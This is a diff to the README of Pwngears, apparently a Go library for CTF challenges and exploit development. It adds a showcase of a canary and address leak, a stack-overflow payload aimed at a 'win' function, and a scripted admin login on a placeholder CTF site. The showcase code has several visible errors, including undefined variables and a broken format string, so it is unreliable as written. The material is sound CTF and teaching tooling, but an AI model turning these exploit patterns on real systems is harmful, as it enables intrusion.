@@ -1,4 +1,4 @@
-Pwngears is a CTF framework and exploit development library based on pwntools. It aimed to provide improved API and better error handling while facilitating the reusability of the exploit. It also aims to provide its core package without any external dependencies, leveraging the Go standard library. 
+Pwngears is a CTF framework and exploit development library based on pwntools. It aims to provide an improved API and better error handling while adding more functionnalities regarding challenges other than binary exploitation. It also aims to provide its core package without any external dependencies, leveraging the Go standard library. 
 
 ## Why Go?
 - Compiles into a static binary, eliminating risk of an exploit not working on somebody else version of the python interpreter. Also has easy cross compilation.
@@ -8,6 +8,75 @@ Pwngears is a CTF framework and exploit development library based on pwntools. I
 - Compare to other great compiled language, Go also provide good developer velocity with a clear and concise syntax.
 - No indentation based blocks, enough said
 
+## Quick Showcase
+```go
+// Binary Exploitation
+p := Process("./supersecure")
+defer p.Close()
+
+p.SendLineAfter("Name: ", "Arthur")
+response := p.RecvLineString()
+
+exploit := NewExploit(r)
+exploit.SetConnectFunc(func() pwn.Tube {
+	conn := Connect("127.0.0.1", 12069)
+	p.SendLine("Arthur")
+	return conn
+})
+
+canary := exploit.LeakCanary(40, func(tube pwn.Tube) bool {
+	resp := tube.RecvLine()
+	return Contains(resp, "Saved")
+})
+
+retAddr := exploit.LeakAddress(40, canary, 8, func(tube pwn.Tube) bool {
+	resp := tube.RecvLine()
+	return Contains(resp, "Saved")
+})
+
+pieBase := retAddr - 0x1811
+winAddr := pieBase + 0x12e9
+
+payload := Pay().
+	PadTo(40).
+	Canary(canary).
+	Repeat("B", 8).
+	P64(winAddr).
+	SendWithSize(r).
+	Send(response)
+
+r.SendPayload(payload)
+
+key := r.RecvAllString(3 * time.Second)
+
+// Web
+conn := Conn("http://some-ctf-website.com")
+
+resp := conn.Get("/search",
+	WithParam("query", "admin"),
+	WithHeader("Content-Type", "application/json"),
+	WithCookie("admin-key", key))
+
+var pass string
+passPattern := regexp.MustCompile(`pass: (.*)`)
+for _, line := range resp.Lines() {
+	pass = pattern.FindStringSubmatch(line)[1]
+}
+
+form := NewForm()
+form.Set("username", "admin")
+form.Set("pass", pass)
+loginResp := conn.Post("/login", form)
+
+var flag string
+flagPattern := regexp.MustCompile(`FLAG:{(.*)}`)
+if flagPattern.MatchString() {
+	flag = flagPattern.FindStringSubmatch(line)[1]
+}
+fmt.Printf("FLAG: %v, flag")
+
+```
+
 ## Installation
 ```sh
 go get github.com/tonythetender/pwngears
@@ -16,7 +85,7 @@ Pwngears uses a hierarchy of different packages detached from the core package w
 
 ```go
 import "github.com/tonythetender/pwngears/web"
-
+```
 If you need to do bruteforcing, you can decide to also import the core bruteforcing package and its web components. 
 ```go
 import (
@@ -91,11 +160,11 @@ fmt.Println(resp.Text())
 ```
 
 You can also add query directly in the string or by adding parameters
-``` go
+```go
 resp := conn.Get("/search",
 	WithParam("category", "shoes"),
-        WithParam("color", "blue"),
-        WithParam("size", "9"))
+	WithParam("color", "blue"),
+	WithParam("size", "9"))
 
 ```
 You can add header the same way or cookies the same way
@@ -220,5 +289,4 @@ Pay().
 	Repeat("B", 8).
 	P64(winAddr).
 	SendWithSize(r)
-
 ```
